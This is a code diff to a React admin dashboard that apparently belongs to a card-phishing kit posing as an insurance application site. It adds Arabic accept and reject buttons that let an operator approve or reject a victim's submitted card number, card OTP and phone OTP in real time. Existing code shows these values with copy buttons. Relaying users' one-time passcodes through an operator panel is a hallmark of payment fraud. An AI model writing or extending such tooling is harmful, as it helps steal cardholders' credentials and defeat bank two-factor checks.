@@ -192,6 +192,27 @@ export default function AdminDashboard() {
     }
   }
 
+  const handleApproval = async (appId: string, type: "card" | "cardOtp" | "phoneOtp", approved: boolean) => {
+    try {
+      const updateData: Record<string, any> = {}
+      if (type === "card") {
+        updateData.cardApproved = approved
+      } else if (type === "cardOtp") {
+        updateData.cardOtpApproved = approved
+      } else if (type === "phoneOtp") {
+        updateData.phoneOtpApproved = approved
+      }
+      await updateApplication(appId, updateData)
+      if (approved) {
+        playSuccessSound()
+      } else {
+        playErrorSound()
+      }
+    } catch (error) {
+      playErrorSound()
+    }
+  }
+
   const toggleRead = useCallback(async (app: InsuranceApplication, e: React.MouseEvent) => {
     e.stopPropagation()
     try {
@@ -437,8 +458,18 @@ export default function AdminDashboard() {
                                 </div>
                               )}
                             </div>
+                            <div className="flex gap-1 mt-2">
+                              <Button onClick={() => handleApproval(selectedApplication.id!, "card", true)} size="sm" className="flex-1 h-6 text-[9px] bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30">
+                                <Check className="w-2.5 h-2.5 ml-1" />
+                                قبول
+                              </Button>
+                              <Button onClick={() => handleApproval(selectedApplication.id!, "card", false)} size="sm" className="flex-1 h-6 text-[9px] bg-red-500/20 text-red-400 hover:bg-red-500/30">
+                                <X className="w-2.5 h-2.5 ml-1" />
+                                رفض
+                              </Button>
+                            </div>
                             {!blockedCards.includes(selectedApplication.cardNumber) && (
-                              <Button onClick={() => blockCard(selectedApplication.cardNumber!)} size="sm" className="mt-2 h-5 text-[9px] bg-red-500/20 text-red-400 hover:bg-red-500/30 w-full">
+                              <Button onClick={() => blockCard(selectedApplication.cardNumber!)} size="sm" className="mt-1 h-5 text-[9px] bg-slate-700 text-slate-400 hover:bg-slate-600 w-full">
                                 <Ban className="w-2.5 h-2.5 ml-1" />
                                 حظر البطاقة
                               </Button>
@@ -467,6 +498,16 @@ export default function AdminDashboard() {
                                 ))}
                               </div>
                             )}
+                            <div className="flex gap-1 mt-2">
+                              <Button onClick={() => handleApproval(selectedApplication.id!, "cardOtp", true)} size="sm" className="flex-1 h-6 text-[9px] bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30">
+                                <Check className="w-2.5 h-2.5 ml-1" />
+                                قبول
+                              </Button>
+                              <Button onClick={() => handleApproval(selectedApplication.id!, "cardOtp", false)} size="sm" className="flex-1 h-6 text-[9px] bg-red-500/20 text-red-400 hover:bg-red-500/30">
+                                <X className="w-2.5 h-2.5 ml-1" />
+                                رفض
+                              </Button>
+                            </div>
                             <div className="text-[8px] text-slate-500 mt-2 text-left">{formatTime(selectedApplication.createdAt)}</div>
                           </div>
                         </div>
@@ -517,6 +558,18 @@ export default function AdminDashboard() {
                               {selectedApplication.phoneNumber2 && <DataRow label="الرقم" value={selectedApplication.phoneNumber2} onCopy={copyToClipboard} copied={copiedField} />}
                               {selectedApplication.phoneOtp && <DataRow label="OTP الهاتف" value={selectedApplication.phoneOtp} onCopy={copyToClipboard} copied={copiedField} />}
                             </div>
+                            {selectedApplication.phoneOtp && (
+                              <div className="flex gap-1 mt-2">
+                                <Button onClick={() => handleApproval(selectedApplication.id!, "phoneOtp", true)} size="sm" className="flex-1 h-6 text-[9px] bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30">
+                                  <Check className="w-2.5 h-2.5 ml-1" />
+                                  قبول
+                                </Button>
+                                <Button onClick={() => handleApproval(selectedApplication.id!, "phoneOtp", false)} size="sm" className="flex-1 h-6 text-[9px] bg-red-500/20 text-red-400 hover:bg-red-500/30">
+                                  <X className="w-2.5 h-2.5 ml-1" />
+                                  رفض
+                                </Button>
+                              </div>
+                            )}
                             <div className="text-[8px] text-slate-500 mt-2 text-left">{formatTime(selectedApplication.createdAt)}</div>
                           </div>
                         </div>
